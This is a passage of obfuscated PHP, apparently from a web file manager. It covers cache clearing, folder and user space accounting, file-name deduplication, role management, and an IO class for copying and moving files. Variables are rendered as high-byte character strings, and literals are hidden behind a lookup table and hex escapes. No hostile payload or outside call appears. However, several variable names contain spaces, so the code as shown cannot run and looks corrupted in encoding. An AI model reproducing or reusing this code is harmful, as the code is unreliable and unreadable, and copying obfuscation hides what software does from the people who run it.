$Ïä¾æ½á =& $_SERVER[¦»×‡Ãã]; if ($Ÿ«Öæ»ş == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$Ïä¾æ½á[533] . $Ÿ«Öæ»ş]); unset(self::$cachePathInfoMore[$Ÿ«Öæ»ş]); unset(self::$cachePathInfo[$Ïä¾æ½á[2280] . $Ÿ«Öæ»ş]); unset(self::$cachePathInfo[$Ïä¾æ½á[2281] . $Ÿ«Öæ»ş]); } public function metaSet($èèÜ÷ß¥, $Üô½çÚÔ = null, $‰š—€áß = null) { $¦™ÒšôÈ = parent::metaSet($èèÜ÷ß¥, $Üô½çÚÔ, $‰š—€áß); if ($¦™ÒšôÈ) { $this->sourceCacheClear($èèÜ÷ß¥); } return $¦™ÒšôÈ; } public function pathInfoByPath($ë™„ğïê, $¡ÚÛİ) { $ùíÌŞ • =& $_SERVER[¦»×‡Ãã]; $¬ùÜŸ§ = !$¡ÚÛİ ? array() : explode($ùíÌŞ •[8], trim($¡ÚÛİ, $ùíÌŞ •[8])); $óåÁ¨şğ = $ë™„ğïê; foreach ($¬ùÜŸ§ as $ËâÍ…ëû) { $ÁºÔëôÅ = array($ùíÌŞ •[192] => $óåÁ¨şğ, $ùíÌŞ •[32] => $ËâÍ…ëû); $ßÆˆİ½ = $this->field($ùíÌŞ •[2282])->where($ÁºÔëôÅ)->select(); if (!$ßÆˆİ½) { return !1; } $ßÆˆİ½ = array_sort_by($ßÆˆİ½, $ùíÌŞ •[505]); $óåÁ¨şğ = $ßÆˆİ½[0][$ùíÌŞ •[193]]; } $°ûÛÂ = $this->sourceInfo($óåÁ¨şğ); $this->pathInfoFilter($°ûÛÂ); return $°ûÛÂ; } protected function updateModifyTime($—É©æóá) { $ßà‡õÍÇ =& $_SERVER[¦»×‡Ãã]; $î»Ôè·µ = defined($ßà‡õÍÇ[2197]) ? USER_ID : 0; if (!$—É©æóá) { return; } if (!is_array($—É©æóá)) { $—É©æóá = array($—É©æóá); } foreach ($—É©æóá as $éĞ¿íÒ¶ => $Ş¿½Üô) { $—É©æóá[$éĞ¿íÒ¶] = intval($Ş¿½Üô); $this->sourceCacheClear($Ş¿½Üô); } $ÔùŸÌ•¾ = array($ßà‡õÍÇ[193] => array($ßà‡õÍÇ[7], $—É©æóá)); $àÁ“ºÓ† = array($ßà‡õÍÇ[651] => $î»Ôè·µ, $ßà‡õÍÇ[498] => time()); $this->where($ÔùŸÌ•¾)->save($àÁ“ºÓ†); } public function folderSizeReset($ŞòÔ–Ô, $Ãë²–‹ = false) { $×¿Œ™Öş =& $_SERVER[¦»×‡Ãã]; if ($this->statusIgnoreResetSpace) { return; } $üà“Ù½ = $this->sourceInfo($ŞòÔ–Ô); $¦Æ¯Š÷ó = $×¿Œ™Öş[2283] . $ŞòÔ–Ô; CacheLock::lock($¦Æ¯Š÷ó, 20); if ($Ãë²–‹ === !1) { $this->sourceCacheClear($ŞòÔ–Ô); $üà“Ù½ = $this->sourceInfo($ŞòÔ–Ô); $èğóûí = array($×¿Œ™Öş[477] => $ŞòÔ–Ô, $×¿Œ™Öş[504] => 0); $Ÿ±¶é¾Û = $this->where($èğóûí)->sum($×¿Œ™Öş[79]); $Ãë²–‹ = intval($Ÿ±¶é¾Û) - intval($üà“Ù½[$×¿Œ™Öş[79]]); } if ($Ãë²–‹ == 0) { return CacheLock::unlock($¦Æ¯Š÷ó); } $ÑÖçéıÃ = $this->parentLevelArray($üà“Ù½[$×¿Œ™Öş[584]]); if (!$ÑÖçéıÃ) { $ÑÖçéıÃ = array(); } $ÑÖçéıÃ[] = $üà“Ù½[$×¿Œ™Öş[193]]; $èğóûí = array($×¿Œ™Öş[193] => array($×¿Œ™Öş[492], $ÑÖçéıÃ)); if ($Ãë²–‹ < 0) { $èğóûí[$×¿Œ™Öş[79]] = array($×¿Œ™Öş[1093], abs($Ãë²–‹)); } $this->where($èğóûí)->setAdd($×¿Œ™Öş[79], $Ãë²–‹); CacheLock::unlock($¦Æ¯Š÷ó); $İ´ ÇÅï = $×¿Œ™Öş[2284] . $üà“Ù½[$×¿Œ™Öş[190]] . $×¿Œ™Öş[4] . $üà“Ù½[$×¿Œ™Öş[569]]; $ÏòÁÂ« = array($üà“Ù½[$×¿Œ™Öş[190]], $üà“Ù½[$×¿Œ™Öş[569]]); TaskRun::timeLimitCall($İ´ ÇÅï, $×¿Œ™Öş[2285], $ÏòÁÂ«, 1.5); } public function folderSizeResetChildren($ìñŠØö) { $ˆ€İùµ =& $_SERVER[¦»×‡Ãã]; $this->sourceCacheClear($ìñŠØö); $Ú¿ßóã¸ = $this->sourceInfo($ìñŠØö); $¿ßÑÖã = array($ˆ€İùµ[646] => 1, $ˆ€İùµ[649] => $Ú¿ßóã¸[$ˆ€İùµ[569]], $ˆ€İùµ[652] => array($ˆ€İùµ[612], $Ú¿ßóã¸[$ˆ€İùµ[584]] . $ìñŠØö . $ˆ€İùµ[613])); $¼‹ıÕ½ó = $ˆ€İùµ[2286]; $‡¸ñÆÆó = $this->field($¼‹ıÕ½ó)->where($¿ßÑÖã)->select(); $¿ßÑÖã[$ˆ€İùµ[485]] = 0; $Ì³‚í¤§ = $this->field($¼‹ıÕ½ó)->where($¿ßÑÖã)->select(); if (!$Ì³‚í¤§) { return; } $‡¸ñÆÆó[] = $Ú¿ßóã¸; $‡¸ñÆÆó = array_to_keyvalue($‡¸ñÆÆó, $ˆ€İùµ[193]); foreach ($‡¸ñÆÆó as $¹ûñ²Æ => $¬í¢íÓñ) { $‡¸ñÆÆó[$¹ûñ²Æ][$ˆ€İùµ[2287]] = $‡¸ñÆÆó[$¹ûñ²Æ][$ˆ€İùµ[79]]; $‡¸ñÆÆó[$¹ûñ²Æ][$ˆ€İùµ[79]] = 0; } foreach ($Ì³‚í¤§ as $¬í¢íÓñ) { $—÷Òô¬Œ = $¬í¢íÓñ[$ˆ€İùµ[192]] . $ˆ€İùµ[12]; if (!isset($‡¸ñÆÆó[$—÷Òô¬Œ])) { continue; } if ($¬í¢íÓñ[$ˆ€İùµ[505]] == $‡¸ñÆÆó[$—÷Òô¬Œ][$ˆ€İùµ[505]]) { $‡¸ñÆÆó[$—÷Òô¬Œ][$ˆ€İùµ[79]] += $¬í¢íÓñ[$ˆ€İùµ[79]]; } } foreach ($‡¸ñÆÆó as $¬í¢íÓñ) { $¢óñ¶ = $this->parentLevelArray($¬í¢íÓñ[$ˆ€İùµ[584]]); foreach ($¢óñ¶ as $—÷Òô¬Œ) { $—÷Òô¬Œ = $—÷Òô¬Œ . $ˆ€İùµ[12]; if (!isset($‡¸ñÆÆó[$—÷Òô¬Œ])) { continue; } if ($¬í¢íÓñ[$ˆ€İùµ[505]] == $‡¸ñÆÆó[$—÷Òô¬Œ][$ˆ€İùµ[505]]) { $‡¸ñÆÆó[$—÷Òô¬Œ][$ˆ€İùµ[79]] += $¬í¢íÓñ[$ˆ€İùµ[79]]; } } } $¹äÔ®Ä = array(); foreach ($‡¸ñÆÆó as $¬í¢íÓñ) { if ($¬í¢íÓñ[$ˆ€İùµ[79]] == $¬í¢íÓñ[$ˆ€İùµ[2287]]) { continue; } $¹äÔ®Ä[] = array($ˆ€İùµ[193], $¬í¢íÓñ[$ˆ€İùµ[193]], $ˆ€İùµ[79], $¬í¢íÓñ[$ˆ€İùµ[79]]); } $this->saveAll($¹äÔ®Ä); } public function userSpaceReset($°Î•Âìã = false) { $Ö¨†Â =& $_SERVER[¦»×‡Ãã]; $ƒÀğı£Ş = $this->where(array($Ö¨†Â[190] => self::TYPE_USER, $Ö¨†Â[569] => $°Î•Âìã, $Ö¨†Â[485] => 0))->sum($Ö¨†Â[79]); $ƒÀğı£Ş = !$ƒÀğı£Ş || $ƒÀğı£Ş <= 0 ? 0 : $ƒÀğı£Ş; Model($Ö¨†Â[577])->userEdit($°Î•Âìã, array($Ö¨†Â[1959] => $ƒÀğı£Ş)); } public function targetSpaceUpdate($¨ÖŸÑäÎ, $’íœÀ»æ) { $î‘˜ë•â =& $_SERVER[¦»×‡Ãã]; if (!$’íœÀ»æ) { return; } if (!in_array($¨ÖŸÑäÎ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $×”ñ×Í¢ = $this->targetSpaceSize($¨ÖŸÑäÎ, $’íœÀ»æ); if ($¨ÖŸÑäÎ == self::TYPE_USER) { Model($î‘˜ë•â[577])->userEdit($’íœÀ»æ, array($î‘˜ë•â[1959] => $×”ñ×Í¢)); } else { if ($¨ÖŸÑäÎ == self::TYPE_GROUP) { Model($î‘˜ë•â[585])->groupEdit($’íœÀ»æ, array($î‘˜ë•â[1959] => $×”ñ×Í¢)); } } } public function targetSpaceSize($•Ø”½ïõ, $µåÆ‘Ö®) { $‡Ú²ˆå =& $_SERVER[¦»×‡Ãã]; $¸›¤ÕÄù = 0; $­Ãá¾×Õ = $this->targetSourceRoot($•Ø”½ïõ, $µåÆ‘Ö®, !0); foreach ($­Ãá¾×Õ as $œãçì) { if (!$œãçì) { continue; } $¸›¤ÕÄù += floatval($œãçì[$‡Ú²ˆå[79]]); $•Ôòğ©ø = array($‡Ú²ˆå[652] => array($‡Ú²ˆå[612], $‡Ú²ˆå[594] . $œãçì[$‡Ú²ˆå[193]] . $‡Ú²ˆå[613])); $ˆˆÆ†«Í = Model($‡Ú²ˆå[503])->field($‡Ú²ˆå[491])->where($•Ôòğ©ø)->select(); $ˆˆÆ†«Í = array_to_keyvalue($ˆˆÆ†«Í, $‡Ú²ˆå[12], $‡Ú²ˆå[193]); $ˆˆÆ†«Í = array_unique(array_filter($ˆˆÆ†«Í)); if ($ˆˆÆ†«Í) { $•Ôòğ©ø = array($‡Ú²ˆå[491] => array($‡Ú²ˆå[492], $ˆˆÆ†«Í)); $¸›¤ÕÄù += floatval($this->where($•Ôòğ©ø)->sum($‡Ú²ˆå[79])); } } $¸›¤ÕÄù = !$¸›¤ÕÄù || $¸›¤ÕÄù <= 0 ? 0 : $¸›¤ÕÄù; return $¸›¤ÕÄù; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($­ÒÇè¹À) { return $this->fileTypeProfile($­ÒÇè¹À, SourceModel::TYPE_USER); } public function groupFileTypeProfile($îÙüİ‰Û) { return $this->fileTypeProfile($îÙüİ‰Û, SourceModel::TYPE_GROUP); } private function fileTypeProfile($—‘‚ÓÌ, $û÷¤É—¢) { $Øø¡Õæ =& $_SERVER[¦»×‡Ãã]; $ä×ú¬Ó = $Øø¡Õæ[2288] . $—‘‚ÓÌ . $Øø¡Õæ[11] . $û÷¤É—¢; $şÂÔ—ó­ = Cache::get($ä×ú¬Ó); if ($şÂÔ—ó­) { return $şÂÔ—ó­; } $õÇ»¾–Ü = array($Øø¡Õæ[646] => 0); if ($—‘‚ÓÌ != !1) { $õÇ»¾–Ü[$Øø¡Õæ[569]] = $—‘‚ÓÌ; $õÇ»¾–Ü[$Øø¡Õæ[190]] = $û÷¤É—¢; } $í“±Äî‚ = array(); $í“±Äî‚[$Øø¡Õæ[2289]] = array($Øø¡Õæ[2290] => LNG($Øø¡Õæ[2289]), $Øø¡Õæ[2291] => $this->where($õÇ»¾–Ü)->count(), $Øø¡Õæ[617] => $this->where($õÇ»¾–Ü)->sum($Øø¡Õæ[79])); $ì¦Õ¬ù× = KodIO::fileTypeList(); foreach ($ì¦Õ¬ù× as $ã€—ÛÁ¼ => $òÉş¨â) { $õÇ»¾–Ü[$Øø¡Õæ[486]] = $this->fileTypeWhere($ã€—ÛÁ¼); $í“±Äî‚[$ã€—ÛÁ¼] = array($Øø¡Õæ[2290] => $òÉş¨â[$Øø¡Õæ[32]], $Øø¡Õæ[2291] => $this->where($õÇ»¾–Ü)->count(), $Øø¡Õæ[617] => $this->where($õÇ»¾–Ü)->sum($Øø¡Õæ[79])); } Cache::set($ä×ú¬Ó, $í“±Äî‚, 1200); return $í“±Äî‚; } public function fileNameExist($ó§Ù«ŸÎ, $ô†„³¥) { $ˆ•İåşÑ =& $_SERVER[¦»×‡Ãã]; $–…¼‚‡š = $this->field($ˆ•İåşÑ[2292])->where(array($ˆ•İåşÑ[192] => $ó§Ù«ŸÎ, $ˆ•İåşÑ[32] => $ô†„³¥, $ˆ•İåşÑ[505] => 0))->find(); return is_array($–…¼‚‡š) ? $–…¼‚‡š[$ˆ•İåşÑ[193]] : !1; } public function childList($ÃòğÖˆß) { $È„Í˜ãˆ =& $_SERVER[¦»×‡Ãã]; $ÔÓóĞ—ƒ = $È„Í˜ãˆ[2265] . $ÃòğÖˆß; if (isset(self::$cacheChildList[$ÔÓóĞ—ƒ])) { return self::$cacheChildList[$ÔÓóĞ—ƒ]; } $ Åü±ªâ = array($È„Í˜ãˆ[192] => intval($ÃòğÖˆß), $È„Í˜ãˆ[505] => 0); $Èıæü×÷ = $this->where($ Åü±ªâ)->select(); $Èıæü×÷ = $Èıæü×÷ ? $Èıæü×÷ : array(); self::$cacheChildList[$ÔÓóĞ—ƒ] = $Èıæü×÷; foreach ($Èıæü×÷ as $ªø´¸¹Ì) { $ÔÓóĞ—ƒ = $È„Í˜ãˆ[533] . $ªø´¸¹Ì[$È„Í˜ãˆ[193]]; self::$cacheSourceInfo[$ÔÓóĞ—ƒ] = $ªø´¸¹Ì; } return $Èıæü×÷; } public function fileNameAuto($§ïæ‰¦—, $Ã²ÑÂ‡¾, $‹ú÷Ì…Í = REPEAT_RENAME, $¾Ûô¿–š = false) { $¿ƒÄ°öÖ =& $_SERVER[¦»×‡Ãã]; $ÕËÏõ¯µ = get_path_ext($Ã²ÑÂ‡¾); $¨éÙ¼²é = $ÕËÏõ¯µ ? get_path_ext_name($Ã²ÑÂ‡¾) . $¿ƒÄ°öÖ[2293] . $ÕËÏõ¯µ : $Ã²ÑÂ‡¾ . $¿ƒÄ°öÖ[460]; $¼ùÜØÏ = array($¿ƒÄ°öÖ[192] => $§ïæ‰¦—, $¿ƒÄ°öÖ[505] => 0, $¿ƒÄ°öÖ[32] => array($¿ƒÄ°öÖ[459], $¨éÙ¼²é)); $ãç±«…ò = $this->field($¿ƒÄ°öÖ[32])->where($¼ùÜØÏ)->select(); $¸‡ˆşá = array_to_keyvalue($ãç±«…ò, $¿ƒÄ°öÖ[12], $¿ƒÄ°öÖ[32]); return $this->fileNameAutoGet($¸‡ˆşá, $Ã²ÑÂ‡¾, $‹ú÷Ì…Í, $¾Ûô¿–š); } public function fileNameAutoGet($–ò°±ìÒ, $¥£‰¤Ûô, $ëİıì±, $‚«Ç„»£) { $”Ó·…Çñ =& $_SERVER[¦»×‡Ãã]; if ($ëİıì± == REPEAT_REPLACE || !$–ò°±ìÒ || !in_array_not_case($¥£‰¤Ûô, $–ò°±ìÒ) || $‚«Ç„»£ && $ëİıì± != REPEAT_RENAME_FOLDER) { return $¥£‰¤Ûô; } if ($ëİıì± == REPEAT_SKIP) { return !1; } $èò¶Æ°‚ = $”Ó·…Çñ[10] . get_path_ext($¥£‰¤Ûô); $èò¶Æ°‚ = $èò¶Æ°‚ == $”Ó·…Çñ[10] || $‚«Ç„»£ ? $”Ó·…Çñ[12] : $èò¶Æ°‚; for ($œÊ€„ = 1; $œÊ€„ <= count($–ò°±ìÒ) + 1; $œÊ€„++) { $÷¸ó¸Şæ = substr($¥£‰¤Ûô, 0, strlen($¥£‰¤Ûô) - strlen($èò¶Æ°‚)); $”ÔÅ•µÔ = $÷¸ó¸Şæ . "\x28{$œÊ€„}\51{$èò¶Æ°‚}"; if (!in_array_not_case($”ÔÅ•µÔ, $–ò°±ìÒ)) { return $”ÔÅ•µÔ; } } } } goto Fù¬ÌÚÑÉÜ; F§ÎÙ»Èå: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\x73\164\x65\155\x5f\x6f\x70\x74\151\x6f\x6e"; protected $jsonField = array("\x6d\145\x6e\x75", "\162\157\x6c\145", "\162\x6f\154\145\x47\x72\157\x75\x70", "\x72\x65\147\x69\163\x74", "\145\155\x61\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($Œ®ÏÏØÇ) { return "\x53\171\x73\x74\145\155\x4f\x70\164\x69\x6f\x6e\x5f{$Œ®ÏÏØÇ}"; } protected function optionDefault($·…öÒô» = '') { $Ÿ€éÍù¬ =& $_SERVER[¦»×‡Ãã]; if ($·…öÒô» == $Ÿ€éÍù¬[12]) { return $GLOBALS[$Ÿ€éÍù¬[6]][$Ÿ€éÍù¬[457]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\155\56\x72\x6f\x6c\145\x4c\151\163\164"; public $field = array("\x6e\141\155\145", "\141\x75\164\x68", "\x6c\141\142\x65\x6c", "\144\x69\163\160\154\x61\x79", "\163\x79\163\164\145\x6d", "\144\145\163\x63", "\151\x67\156\x6f\162\145\x45\170\x74", "\151\x67\x6e\157\162\x65\106\x69\154\145\x53\x69\172\x65", "\x61\x64\x6d\151\156\151\x73\164\x72\x61\x74\x6f\x72", "\163\157\x72\x74"); public function listData($¥Â€¾í© = false, $›š¦¥õú = "\x73\x6f\162\x74", $ŸÒË‘÷… = false) { $ıÍ†‚ü =& $_SERVER[¦»×‡Ãã]; $¢À€…Ò¸ = parent::listData($¥Â€¾í©, $›š¦¥õú, $ŸÒË‘÷…); if (!$¥Â€¾í©) { foreach ($¢À€…Ò¸ as $ˆÛ«Óóà => $§ş˜¤¾ï) { if ($§ş˜¤¾ï[$ıÍ†‚ü[2178]] == 1) { $¢À€…Ò¸[$ˆÛ«Óóà][$ıÍ†‚ü[526]] = LNG($ıÍ†‚ü[2439]); } } } return $¢À€…Ò¸; } public function update($»ºè­µÓ, $ú¾ŞÉŸ) { $é‹Ä• =& $_SERVER[¦»×‡Ãã]; $ö™»«®² = parent::listData($»ºè­µÓ); $¹É¼£ƒ· = $this->findByName($ú¾ŞÉŸ[$é‹Ä•[32]]); if (!$ö™»«®² || $¹É¼£ƒ· && $¹É¼£ƒ·[$é‹Ä•[475]] != $ö™»«®²[$é‹Ä•[475]]) { return !1; } if ($¹É¼£ƒ·[$é‹Ä•[2178]] == 1) { $ú¾ŞÉŸ = array($é‹Ä•[32] => $ú¾ŞÉŸ[$é‹Ä•[32]], $é‹Ä•[1994] => $ú¾ŞÉŸ[$é‹Ä•[1994]]); } $this->filterAuth($ú¾ŞÉŸ[$é‹Ä•[487]]); return parent::update($»ºè­µÓ, $ú¾ŞÉŸ); } public function remove($ÖÑƒÃ³Ô) { $ Ù„ÚÒ¬ = parent::listData($ÖÑƒÃ³Ô); if (!$ Ù„ÚÒ¬ || $ Ù„ÚÒ¬[$_SERVER[¦»×‡Ãã][191]]) { return !1; } return parent::remove($ÖÑƒÃ³Ô); } public function add($Å¬ÀúÁ) { $²õàÀä¦ =& $_SERVER[¦»×‡Ãã]; $œ¾€Š¨â = $Å¬ÀúÁ[$²õàÀä¦[32]]; if ($this->findByName($œ¾€Š¨â)) { return !1; } $Ê‹ú±õá = array($²õàÀä¦[494] => $œ¾€Š¨â, $²õàÀä¦[1977] => $²õàÀä¦[12], $²õàÀä¦[1973] => $²õàÀä¦[1981], $²õàÀä¦[2440] => 1, $²õàÀä¦[1976] => 0, $²õàÀä¦[2441] => 0, $²õàÀä¦[1975] => $this->getSort()); $Å¬ÀúÁ = array_merge($Ê‹ú±õá, $Å¬ÀúÁ); $this->filterAuth($Å¬ÀúÁ[$²õàÀä¦[487]]); return parent::insert($Å¬ÀúÁ); } private function getSort() { $ï¸×Ö‰ç =& $_SERVER[¦»×‡Ãã]; $ø£×Û¡¥ = parent::listData(); $ÀåÄ‡ª± = array_to_keyvalue($ø£×Û¡¥, $ï¸×Ö‰ç[12], $ï¸×Ö‰ç[1995]); return empty($ÀåÄ‡ª±) ? 0 : max($ÀåÄ‡ª±) + 1; } private function filterAuth(&$ëŒ•¸Óö) { $ôÉúÕ² =& $_SERVER[¦»×‡Ãã]; $Û†Åù˜ = array(); $”ğÑ±ü = array_filter(explode($ôÉúÕ²[50], $ëŒ•¸Óö)); foreach ($”ğÑ±ü as $ëŒ•¸Óö) { $ùşùü¨† = explode($ôÉúÕ²[10], $ëŒ•¸Óö); if ($ùşùü¨†[0] == $ôÉúÕ²[2442] && $ùşùü¨†[1] != $ôÉúÕ²[1275]) { $É³¿½äŞ = $ùşùü¨†[0] . $ôÉúÕ²[10] . $ùşùü¨†[1] . $ôÉúÕ²[2443]; if (!in_array($É³¿½äŞ, $”ğÑ±ü)) { $Û†Åù˜[] = $É³¿½äŞ; } } $Û†Åù˜[] = $ëŒ•¸Óö; } $ëŒ•¸Óö = implode($ôÉúÕ²[50], $Û†Åù˜); } public function findRoleDefault() { $Ôœœç·“ =& $_SERVER[¦»×‡Ãã]; $Ş¸Ìü = parent::listData(); $©ÚÚ×‰§ = !1; foreach ($Ş¸Ìü as $Ö›çÉ®´) { if (!$Ö›çÉ®´ || $Ö›çÉ®´[$Ôœœç·“[1993]] == $Ôœœç·“[228] || $Ö›çÉ®´[$Ôœœç·“[2178]] == 1) { continue; } if (strstr($Ö›çÉ®´[$Ôœœç·“[487]], $Ôœœç·“[2444])) { continue; } if (!strstr($Ö›çÉ®´[$Ôœœç·“[487]], $Ôœœç·“[2445])) { continue; } if (!$©ÚÚ×‰§) { $©ÚÚ×‰§ = $Ö›çÉ®´; continue; } $ ½ÇœŒ„ = explode($Ôœœç·“[50], $©ÚÚ×‰§[$Ôœœç·“[487]]); $°ÆÏ‰Ÿ± = explode($Ôœœç·“[50], $Ö›çÉ®´[$Ôœœç·“[487]]); if (count($ ½ÇœŒ„) > count($°ÆÏ‰Ÿ±)) { $©ÚÚ×‰§ = $Ö›çÉ®´; } } return $©ÚÚ×‰§ ? $©ÚÚ×‰§[$Ôœœç·“[475]] : $Ôœœç·“[12]; } public function sort($ìßƒ¢†î, $Áø“‘´”) { return parent::update($ìßƒ¢†î, $Áø“‘´”); } } goto C›Îæ±ÅŠ; A‰„ˆ¬í­: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ŸÌÀ§ï¹, $éõ³ğøİ) { $§Û¹à¹ò =& $_SERVER[¦»×‡Ãã]; $Ã†Ñò«ó = $éõ³ğøİ; $GLOBALS[$§Û¹à¹ò[1227]] = $§Û¹à¹ò[1228] . $ŸÌÀ§ï¹; Hook::trigger($§Û¹à¹ò[1228] . $ŸÌÀ§ï¹ . $§Û¹à¹ò[1229], $Ã†Ñò«ó); $šì¢£óì = self::driverMake($éõ³ğøİ[0]); if (!$šì¢£óì) { return !1; } if (method_exists($šì¢£óì, $ŸÌÀ§ï¹)) { $Ë§ŞìÛ = @call_user_func_array(array($šì¢£óì, $ŸÌÀ§ï¹), $éõ³ğøİ); } else { if (method_exists($šì¢£óì, $§Û¹à¹ò[1230])) { $Ë§ŞìÛ = @call_user_func_array(array($šì¢£óì, $ŸÌÀ§ï¹), $éõ³ğøİ); } else { if (method_exists(self, $ŸÌÀ§ï¹)) { $Ë§ŞìÛ = @call_user_func_array(array(self, $ŸÌÀ§ï¹), $éõ³ğøİ); } else { $Ë§ŞìÛ = call_user_func_array(array(parent, $ŸÌÀ§ï¹), $éõ³ğøİ); } } } Hook::trigger($§Û¹à¹ò[1228] . $ŸÌÀ§ï¹ . $§Û¹à¹ò[1231], $Ã†Ñò«ó, $Ë§ŞìÛ); return $Ë§ŞìÛ; } public static function init($‘™”ÌÕ·) { return self::driverMake($‘™”ÌÕ·); } public static function copy($öåéæûí, $­Ö¥¬ı©, $ğ¦ú¾Š = false, $ØíãÑ¿Ô = false) { return self::copyMoveStart($öåéæûí, $­Ö¥¬ı©, $ğ¦ú¾Š, $_SERVER[¦»×‡Ãã][618], $ØíãÑ¿Ô); } public static function move($Ä™¿˜£±, $Õ¶Ï¤¿, $³º“ì¤ô = false, $ˆÊÌÊ‘Î = false) { return self::copyMoveStart($Ä™¿˜£±, $Õ¶Ï¤¿, $³º“ì¤ô, $_SERVER[¦»×‡Ãã][620], $ˆÊÌÊ‘Î); } private static function copyMoveStart($²¶ã°¸˜, $ªù¡äİ‘, $ìß½À’¨, $Ï¤ÓëÅä, $û‹êà¡É) { $œöÒ±Å¿ =& $_SERVER[¦»×‡Ãã]; $Û¼ò ±‹ = array($²¶ã°¸˜, $ªù¡äİ‘, $ìß½À’¨, $û‹êà¡É); Hook::trigger($œöÒ±Å¿[1228] . $Ï¤ÓëÅä . $œöÒ±Å¿[1229], $Û¼ò ±‹); $ÉËÔì˜‘ = self::copyMove($²¶ã°¸˜, $ªù¡äİ‘, $ìß½À’¨, $Ï¤ÓëÅä, $û‹êà¡É); Hook::trigger($œöÒ±Å¿[1228] . $Ï¤ÓëÅä . $œöÒ±Å¿[1231], $Û¼ò ±‹, $ÉËÔì˜‘); return $ÉËÔì˜‘; } public static function saveFile($İäö–§¯, $÷ùøŸ‡³, $¹Á¸Öº¸ = true) { $Üó”ìÌµ =& $_SERVER[¦»×‡Ãã]; $‹¶˜¶Æå = self::info($÷ùøŸ‡³); $Û‰ù¢ = self::driverMake($İäö–§¯); $Ùç²ñÙë = self::driverMake($÷ùøŸ‡³); $í­ÛÌ°‚ = !1; if ($Ùç²ñÙë->pathParse[$Üó”ìÌµ[1232]]) { $í­ÛÌ°‚ = $Ùç²ñÙë; $Ê®¥ÉÁ = $Ùç²ñÙë->pathParse[$Üó”ìÌµ[1232]]; $Ùç²ñÙë = self::driverMake($Ê®¥ÉÁ); } if ($Û‰ù¢->pathParse[$Üó”ìÌµ[1232]]) { $³–‰ØŠ‡ = $Û‰ù¢->pathParse[$Üó”ìÌµ[1232]]; $Û‰ù¢ = self::driverMake($³–‰ØŠ‡); } $úÌ™½¯ë = $Ùç²ñÙë->pathFather($÷ùøŸ‡³); $şß„Ö±  = !0; if (!$¹Á¸Öº¸ && self::driverIsSame($Û‰ù¢, $Ùç²ñÙë)) { $şß„Ö±  = !1; } $˜¯âİ¦Í = self::copyFile($Û‰ù¢, $İäö–§¯, $Ùç²ñÙë, $úÌ™½¯ë, $‹¶˜¶Æå[$Üó”ìÌµ[32]], $şß„Ö± ); if ($í­ÛÌ°‚) { $˜¯âİ¦Í = $í­ÛÌ°‚->getPathOuter($˜¯âİ¦Í); } return $˜¯âİ¦Í; } private static function copyMove($¤œ€ºà², $’Š£Õ¶³, $¿Æ°ªœ…, $ÖÆ…ù“†, $Ö¨ò‡õ² = false) { $İ«åàâÜ =& $_SERVER[¦»×‡Ãã]; if (!$¤œ€ºà² || $¤œ€ºà² == $İ«åàâÜ[8] || !$’Š£Õ¶³) { return !1; } ignore_timeout(); $î•°íŒ„ = self::driverMake($¤œ€ºà²); $Ûïš™šŒ = self::driverMake($’Š£Õ¶³); $Ù¸É§ş‰ = $ÖÆ…ù“† == $İ«åàâÜ[620]; $øÆ•æğ = !1; if ($Ûïš™šŒ->pathParse[$İ«åàâÜ[1232]]) { $øÆ•æğ = $Ûïš™šŒ; $’Š£Õ¶³ = $Ûïš™šŒ->pathParse[$İ«åàâÜ[1232]]; $Ûïš™šŒ = self::driverMake($’Š£Õ¶³); } if ($î•°íŒ„->pathParse[$İ«åàâÜ[1232]]) { $¤œ€ºà² = $î•°íŒ„->pathParse[$İ«åàâÜ[1232]]; $î•°íŒ„ = self::driverMake($¤œ€ºà²); } self::check($î•°íŒ„, $¤œ€ºà², $Ûïš™šŒ, $’Š£Õ¶³); Hook::trigger($İ«åàâÜ[1233], $î•°íŒ„, $¤œ€ºà², $Ûïš™šŒ, $’Š£Õ¶³); $çšÑ“½ı = self::driverIsSame($î•°íŒ„, $Ûïš™šŒ); if ($çšÑ“½ı) { if ($ÖÆ…ù“† == $İ«åàâÜ[620] && !method_exists($Ûïš™šŒ, $İ«åàâÜ[1234]) && trim($’Š£Õ¶³, $İ«åàâÜ[8]) == trim($Ûïš™šŒ->pathFather($¤œ€ºà²), $İ«åàâÜ[8])) { if ($î•°íŒ„->pathThis($¤œ€ºà²) != $Ö¨ò‡õ² && !$î•°íŒ„->isOsDriver()) { return $î•°íŒ„->rename($¤œ€ºà², $Ö¨ò‡õ²); } return $Ûïš™šŒ->getPathOuter($¤œ€ºà²); } if (method_exists($Ûïš™šŒ, $ÖÆ…ù“†)) { return $Ûïš™šŒ->{$ÖÆ…ù“†}($¤œ€ºà², $’Š£Õ¶³, $¿Æ°ªœ…, $Ö¨ò‡õ²); } } if ($çšÑ“½ı && $ÖÆ…ù“† == $İ«åàâÜ[620] && $Ûïš™šŒ->getType() == $İ«åàâÜ[109]) { $ãğ–·„™ = $Ûïš™šŒ->movePath($¤œ€ºà², $’Š£Õ¶³, $Ö¨ò‡õ²); if ($ãğ–·„™) { return $ãğ–·„™; } } $úêì¤ = $î•°íŒ„->isFile($¤œ€ºà²); if (!$úêì¤ && $Ûïš™šŒ->getType() == $İ«åàâÜ[830] && $î•°íŒ„->getType() == $İ«åàâÜ[109]) { $ãğ–·„™ = $Ûïš™šŒ->copyFolderFromIO($î•°íŒ„, $¤œ€ºà², $’Š£Õ¶³, $¿Æ°ªœ…, $Ù¸É§ş‰, $Ö¨ò‡õ²); } else { $ãğ–·„™ = self::copyPath($î•°íŒ„, $¤œ€ºà², $Ûïš™šŒ, $’Š£Õ¶³, $¿Æ°ªœ…, $Ù¸É§ş‰, $úêì¤, $Ö¨ò‡õ²); } if ($ãğ–·„™ && $Ù¸É§ş‰) { $î•°íŒ„->remove($¤œ€ºà²); } if ($øÆ•æğ) { $ãğ–·„™ = $øÆ•æğ->getPathOuter($ãğ–·„™); } return $ãğ–·„™; } private static function check($îÛá•Ãá, 